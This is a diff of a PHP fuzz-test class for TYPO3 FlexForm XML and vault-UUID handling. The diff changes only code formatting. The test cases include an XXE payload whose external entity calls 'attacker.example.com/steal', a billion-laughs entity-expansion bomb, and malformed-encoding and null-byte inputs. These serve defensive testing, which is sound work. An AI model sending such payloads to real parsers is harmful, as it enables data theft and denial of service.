@@ -21,6 +21,8 @@ use Psr\Log\NullLogger;
 use stdClass;
 use TYPO3\CMS\Core\Schema\TcaSchemaFactory;
 
+use function chr;
+
 /**
  * Fuzz tests for FlexForm XML / array resolution pathways.
  *
@@ -92,42 +94,42 @@ final class FlexFormXmlFuzzTest extends TestCase
                 '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.example.com/steal">]><r>&xxe;</r>',
             ],
             'billion laughs' => [
-                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">' .
-                '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' .
-                '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' .
-                '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' .
-                ']><lolz>&lol4;</lolz>',
+                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
+                . '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
+                . '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
+                . '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
+                . ']><lolz>&lol4;</lolz>',
             ],
-            'unclosed tags' => ['<T3FlexForms><data><sheet><field>'],
-            'mixed tag soup' => ['</close><open><mix/></foo></bar>'],
+            'unclosed tags'                => ['<T3FlexForms><data><sheet><field>'],
+            'mixed tag soup'               => ['</close><open><mix/></foo></bar>'],
             'invalid encoding declaration' => [
                 '<?xml version="1.0" encoding="DOES-NOT-EXIST-123"?><r/>',
             ],
-            'utf16 bom' => ["\xFF\xFE<r/>"],
-            'utf8 bom' => ["\xEF\xBB\xBF<r/>"],
+            'utf16 bom'                 => ["\xFF\xFE<r/>"],
+            'utf8 bom'                  => ["\xEF\xBB\xBF<r/>"],
             'wrong encoding claim utf7' => ['<?xml version="1.0" encoding="UTF-7"?><r>+ACE-</r>'],
-            'stray null bytes' => ["<r>\x00foo\x00bar</r>"],
-            'deeply nested xml 200' => [str_repeat('<n>', 200) . str_repeat('</n>', 200)],
-            'catastrophic regex bait' => [str_repeat('a', 500) . 'b'],
+            'stray null bytes'          => ["<r>\x00foo\x00bar</r>"],
+            'deeply nested xml 200'     => [str_repeat('<n>', 200) . str_repeat('</n>', 200)],
+            'catastrophic regex bait'   => [str_repeat('a', 500) . 'b'],
             // UUID look-alikes that must not be treated as vault UUIDs
-            'uuid v1 not v7' => ['<r>00000000-0000-1000-8000-000000000001</r>'],
-            'uuid v4 not v7' => ['<r>00000000-0000-4000-8000-000000000001</r>'],
-            'uuid v7 variant 0' => ['<r>01937b6e-4b6c-7abc-0def-0123456789ab</r>'],
-            'fake uuid all zeros' => ['<r>00000000-0000-0000-0000-000000000000</r>'],
-            'uuid with wrong separator' => ['<r>01937b6e_4b6c_7abc_8def_0123456789ab</r>'],
+            'uuid v1 not v7'             => ['<r>00000000-0000-1000-8000-000000000001</r>'],
+            'uuid v4 not v7'             => ['<r>00000000-0000-4000-8000-000000000001</r>'],
+            'uuid v7 variant 0'          => ['<r>01937b6e-4b6c-7abc-0def-0123456789ab</r>'],
+            'fake uuid all zeros'        => ['<r>00000000-0000-0000-0000-000000000000</r>'],
+            'uuid with wrong separator'  => ['<r>01937b6e_4b6c_7abc_8def_0123456789ab</r>'],
             'embedded long text no uuid' => ['<r>' . str_repeat('abcdef1234567890', 200) . '</r>'],
-            'empty' => [''],
-            'single char' => ['x'],
-            'nul bytes only' => [str_repeat("\x00", 100)],
-            'crlf only' => [str_repeat("\r\n", 50)],
+            'empty'                      => [''],
+            'single char'                => ['x'],
+            'nul bytes only'             => [str_repeat("\x00", 100)],
+            'crlf only'                  => [str_repeat("\r\n", 50)],
         ];
 
         // Add 10 random junk payloads
-        for ($i = 0; $i < 10; $i++) {
+        for ($i = 0; $i < 10; ++$i) {
             $len = mt_rand(0, 500);
             $buf = '';
-            for ($j = 0; $j < $len; $j++) {
-                $buf .= \chr(mt_rand(0, 255));
+            for ($j = 0; $j < $len; ++$j) {
+                $buf .= chr(mt_rand(0, 255));
             }
 
             $cases["random_{$i}_len{$len}"] = [$buf];
@@ -144,27 +146,27 @@ final class FlexFormXmlFuzzTest extends TestCase
     public static function nonUuidValueProvider(): array
     {
         return [
-            'null' => [null],
-            'true' => [true],
-            'false' => [false],
-            'int zero' => [0],
-            'int 42' => [42],
-            'int max' => [PHP_INT_MAX],
-            'float' => [3.14],
-            'array empty' => [[]],
-            'array nested' => [[[['uuid' => '01937b6e-4b6c-7abc-8def-000000000001']]]],
-            'stdclass' => [new stdClass()],
-            'empty string' => [''],
-            'short string' => ['abc'],
-            'uuid v1' => ['00000000-0000-1000-8000-000000000001'],
-            'uuid v4' => ['00000000-0000-4000-8000-000000000001'],
-            'uuid v7 wrong variant' => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
-            'uuid underscores' => ['01937b6e_4b6c_7abc_8def_0123456789ab'],
-            'uuid too short' => ['01937b6e-4b6c-7abc-8def'],
-            'uuid too long' => ['01937b6e-4b6c-7abc-8def-0123456789abcd'],
-            'uuid non-hex' => ['01937b6e-4b6c-7abc-8def-zzzzzzzzzzzz'],
+            'null'                       => [null],
+            'true'                       => [true],
+            'false'                      => [false],
+            'int zero'                   => [0],
+            'int 42'                     => [42],
+            'int max'                    => [PHP_INT_MAX],
+            'float'                      => [3.14],
+            'array empty'                => [[]],
+            'array nested'               => [[[['uuid' => '01937b6e-4b6c-7abc-8def-000000000001']]]],
+            'stdclass'                   => [new stdClass()],
+            'empty string'               => [''],
+            'short string'               => ['abc'],
+            'uuid v1'                    => ['00000000-0000-1000-8000-000000000001'],
+            'uuid v4'                    => ['00000000-0000-4000-8000-000000000001'],
+            'uuid v7 wrong variant'      => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
+            'uuid underscores'           => ['01937b6e_4b6c_7abc_8def_0123456789ab'],
+            'uuid too short'             => ['01937b6e-4b6c-7abc-8def'],
+            'uuid too long'              => ['01937b6e-4b6c-7abc-8def-0123456789abcd'],
+            'uuid non-hex'               => ['01937b6e-4b6c-7abc-8def-zzzzzzzzzzzz'],
             'uuid with surrounding text' => [' 01937b6e-4b6c-7abc-8def-0123456789ab '],
-            'uuid with null byte' => ["01937b6e-4b6c-7abc-8def-0123\x00567abc"],
+            'uuid with null byte'        => ["01937b6e-4b6c-7abc-8def-0123\x00567abc"],
         ];
     }
 
@@ -241,8 +243,8 @@ final class FlexFormXmlFuzzTest extends TestCase
     {
         // Build 100-level nested array with a vault UUID at the bottom
         $validUuid = '01937b6e-4b6c-7abc-8def-0123456789ab';
-        $leaf = ['secret' => $validUuid];
-        for ($i = 0; $i < 100; $i++) {
+        $leaf      = ['secret' => $validUuid];
+        for ($i = 0; $i < 100; ++$i) {
             $leaf = ['level_' . $i => $leaf];
         }
 
@@ -328,13 +330,13 @@ final class FlexFormXmlFuzzTest extends TestCase
     public static function invalidUuidVariantProvider(): array
     {
         return [
-            'v1 uuid' => ['00000000-0000-1000-8000-000000000001'],
-            'v2 uuid' => ['00000000-0000-2000-8000-000000000001'],
-            'v3 uuid' => ['00000000-0000-3000-8000-000000000001'],
-            'v4 uuid' => ['00000000-0000-4000-8000-000000000001'],
-            'v5 uuid' => ['00000000-0000-5000-8000-000000000001'],
-            'v6 uuid' => ['00000000-0000-6000-8000-000000000001'],
-            'v7 variant 0' => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
+            'v1 uuid'                 => ['00000000-0000-1000-8000-000000000001'],
+            'v2 uuid'                 => ['00000000-0000-2000-8000-000000000001'],
+            'v3 uuid'                 => ['00000000-0000-3000-8000-000000000001'],
+            'v4 uuid'                 => ['00000000-0000-4000-8000-000000000001'],
+            'v5 uuid'                 => ['00000000-0000-5000-8000-000000000001'],
+            'v6 uuid'                 => ['00000000-0000-6000-8000-000000000001'],
+            'v7 variant 0'            => ['01937b6e-4b6c-7abc-0def-0123456789ab'],
             'v7 variant c (reserved)' => ['01937b6e-4b6c-7abc-cdef-0123456789ab'],
             'v7 variant f (reserved)' => ['01937b6e-4b6c-7abc-fdef-0123456789ab'],
         ];
